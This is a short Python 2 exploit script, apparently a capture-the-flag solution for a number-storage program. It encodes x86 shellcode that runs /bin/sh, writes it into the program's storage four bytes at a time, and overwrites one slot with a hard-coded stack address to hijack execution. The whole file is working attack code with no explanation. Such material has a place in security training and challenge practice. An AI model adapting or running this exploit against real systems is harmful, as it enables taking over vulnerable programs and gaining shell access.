#!/usr/bin/env python2
import struct
import sys

shellcode="\x90\x90\x90\x90\x31\xc0\x50\x90\x90\x90\xeb\x04\x90\x90\x90\x90\x68\x2f\x2f\x73\x68\x90\xeb\x04\x90\x90\x90\x90\x68\x2f\x62\x69\x6e\x90\xeb\x04\x90\x90\x90\x90\x89\xe3\x50\x89\xe2\x90\xeb\x04\x90\x90\x90\x90\x53\x89\xe1\xb0\x0b\x90\xeb\x04\x90\x90\x90\x90\xcd\x80\x90\x90"

def write_number(i, num):
	sys.stdout.write("store\n")
	sys.stdout.flush()
	
	sys.stdout.write(str(num)+"\n")
	sys.stdout.flush()

	sys.stdout.write(str(i)+"\n")
	sys.stdout.flush()



for i in range(len(shellcode)/4):
	num = struct.unpack("<L", shellcode[i*4:(i+1)*4])[0]
	write_number(i, num)

write_number(109, 0xffffd93c)
	
sys.stdout.write("quit\n")
sys.stdout.flush()



